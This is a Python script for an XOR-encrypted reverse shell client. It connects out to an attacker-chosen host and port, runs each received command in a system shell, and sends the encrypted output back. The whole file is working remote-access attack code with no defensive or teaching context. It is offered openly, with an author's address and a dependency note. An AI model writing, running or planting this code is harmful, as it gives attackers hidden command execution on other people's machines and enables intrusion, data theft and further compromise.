#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Python all
# made by  Xtr3am3r.0k@gmail.com
# need pycrypto https://www.dlitz.net/software/pycrypto/

import os
import subprocess
import argparse
from socket import socket, AF_INET, SOCK_STREAM
from Crypto.Cipher import XOR

parser = argparse.ArgumentParser(description='XOR Shell Client')
parser.add_argument('-a','--host', help='set lhost', required=True)
parser.add_argument('-p','--port', help='set lport', required=True)
parser.add_argument('-k','--key', help='set XOR key', required=True)
args = vars(parser.parse_args())

myHOST = args['host']
myPORT = int(args['port'])
key = args['key']

def encrypter(cleardata):
    data = XOR.XORCipher(key)
    return data.encrypt(cleardata)

def decrypter(cleardata):
    data = XOR.XORCipher(key)
    return data.decrypt(cleardata)


def client():
    sockobj = socket(AF_INET, SOCK_STREAM)
    sockobj.connect((myHOST, myPORT))

    while True:
        output = ''
        data = (decrypter(sockobj.recv(1024))).decode('cp866')
        if data[:2] == 'cd':
            try:
                os.chdir(data[3:])
            except:
                output += 'enter cd error'

        if len(data) > 0:
            cmd = subprocess.Popen(data[:], shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE)
            output = (cmd.stdout.read() + cmd.stderr.read()).decode('cp866')
            sockobj.send(encrypter(output + (os.getcwd() + '> ')))

    sockobj.close()

try:
    client()
except:
    print('An error occured')
